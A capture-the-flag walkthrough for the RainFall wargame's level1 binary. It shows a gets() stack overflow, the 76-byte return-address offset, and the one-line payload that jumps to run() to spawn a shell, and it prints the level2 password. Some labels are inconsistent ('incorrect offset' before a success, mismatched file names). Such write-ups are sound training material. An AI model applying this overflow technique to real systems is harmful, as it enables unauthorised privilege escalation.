# Level1 -> 2

## Objective

The goal of Level 2 is to escalate from `level1` to `level2` by exploiting a buffer overflow vulnerability in the `level1` binary. By the end, you should be able to read the password for `level2`.

---

## Step 1: Examine the Binary

After switching to `level1`:

```bash
level0@RainFall:~$ su level1
Password:
level1@RainFall:~$ ls
level1
```

Running the binary with various input lengths shows:

```bash
level1@RainFall:~$ ./level1
aaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level1@RainFall:~$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

> Observations:
>
> * The program crashes after a long input → likely a **buffer overflow**.

---

## Step 2: Analyze in GDB

List functions:

```bash
(gdb) info functions
0x08048360  system
0x08048444  run
0x08048480  main
```

> We will attempt to overwrite the return address to jump to `system()`.

After analyzing run we can see a call to system(). Let's try to redirect our program to run.

---

## Step 3: Investigate with `ltrace`

```bash
level1@RainFall:~$ ltrace ./level1
gets(0xbffff720, 47, ...) = 0xbffff720
--- SIGSEGV (Segmentation fault) ---
```

> The program uses `gets()`, which **does not check buffer lengths**, confirming a buffer overflow vulnerability.

---

## Step 4: Determine Offset

To exploit the overflow, we need to find the exact offset to overwrite the return address.

```bash
python -c 'print "Aa0Aa1Aa2Aa3Aa..."' > /tmp/ovcycle
gdb ./level1
(gdb) r < /tmp/ovcycle
Starting program: /home/user/level1/level1 < /tmp/lv2

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

> 0x63413563 corresponds to an offset of 76 in the given pattern

---

## Step 5: Craft Exploit

First attempt (incorrect offset):

```bash
python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/test
./level1 < /tmp/test
Good... Wait what?
```

> Success! The program executes, giving us a shell-like prompt.

---

## Step 6: Escalate to `level2`

Interact with the program:

```bash
cat /tmp/test - | ./level1
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
exit
```

* The password for `level2` is revealed.
* Exit:

```bash
exit
```

---

## Step 7: Summary

* **Vulnerability:** `gets()` allows a buffer overflow.
* **Offset:** 76 bytes to the return address.
* **Target:** `system()` function in `run()`.
* **Outcome:** Shell execution allows reading the `level2` password.

> With this, you can `su level2` using the retrieved password.

---

**End of Level 2 Walkthrough**
